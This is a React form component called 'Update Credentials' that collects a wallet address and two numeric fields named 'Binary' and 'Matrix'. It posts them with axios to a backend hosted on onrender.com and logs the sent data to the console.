import React, { useState } from "react";
import { TextField, Button, Box } from "@mui/material";
import axios from "axios";

const UpdateCredentials = () => {
  const [walletaddress, setWalletAddress] = useState("");
  const [binary, setBinary] = useState("");
  const [matrix, setMatrix] = useState("");
const handleSubmit = async (e) => {
  e.preventDefault();

  const data = {
    walletaddress, // walletId or walletAddress
    binary,
    matrix,
  };

  console.log("Sending data:", data); // Log the data being sent

  try {
    const response = await axios.post(
      "https://cryptowallet-2.onrender.com/submit",
      data
    );
    console.log(response.data);
  } catch (error) {
    console.error(
      "Error submitting form:",
      error.response ? error.response.data : error.message
    );
  }
};


  return (
    <Box
      component="form"
      onSubmit={handleSubmit}
      sx={{
        display: "flex",
        flexDirection: "column",
        gap: "30px", // Increased space between form elements
        width: "400px", // Increased width for more spacious layout
        margin: "0 auto", // Center the form
        padding: "30px", // Increased padding around the form
        boxShadow: "0px 4px 8px rgba(0, 0, 0, 0.1)",
        borderRadius: "10px",
        backgroundColor: "#fff", // Form background color
      }}
    >
      <h3 style={{ textAlign: "center", fontSize: "20px", color: "#1976D2" }}>
        Update Credentials
      </h3>

      {/* Wallet Address Input */}
      <TextField
        label="Wallet Address"
        variant="outlined"
        value={walletaddress}
        onChange={(e) => setWalletAddress(e.target.value)}
        required
        sx={{
          backgroundColor: "#f0f0f0", // Light grey background for visibility
          "& .MuiOutlinedInput-root": {
            backgroundColor: "#f0f0f0", // Ensures background color stays even with border
          },
        }}
      />

      {/* First Number Input */}
      <TextField
        label="Binary"
        type="number"
        variant="outlined"
        value={binary}
        onChange={(e) => setBinary(e.target.value)}
        required
        sx={{
          backgroundColor: "#f0f0f0", // Light grey background for visibility
          "& .MuiOutlinedInput-root": {
            backgroundColor: "#f0f0f0", // Ensures background color stays even with border
          },
        }}
      />

      {/* Second Number Input */}
      <TextField
        label="Matrix"
        type="number"
        variant="outlined"
        value={matrix}
        onChange={(e) => setMatrix(e.target.value)}
        required
        sx={{
          backgroundColor: "#f0f0f0", // Light grey background for visibility
          "& .MuiOutlinedInput-root": {
            backgroundColor: "#f0f0f0", // Ensures background color stays even with border
          },
        }}
      />

      {/* Submit Button */}
      <Button type="submit" variant="contained" color="primary">
        Update
      </Button>
    </Box>
  );
};

export default UpdateCredentials;
